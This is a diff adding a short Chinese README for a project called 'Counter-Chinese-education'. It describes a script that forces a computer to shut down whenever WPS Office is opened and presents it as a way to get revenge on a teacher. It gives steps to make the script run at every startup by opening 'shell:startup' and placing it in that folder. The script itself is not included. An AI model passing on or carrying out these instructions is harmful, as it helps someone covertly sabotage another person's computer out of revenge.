@@ -1,0 +1,2 @@
+# Counter-Chinese-education
+这是一个只要你打开wps办公软件就会自动让计算机关机的脚本，当你被老师针对时可以用此项目报复。按住win+r输入shell：startup然后按enter，打开开机自启动文件夹后将脚本放进去。
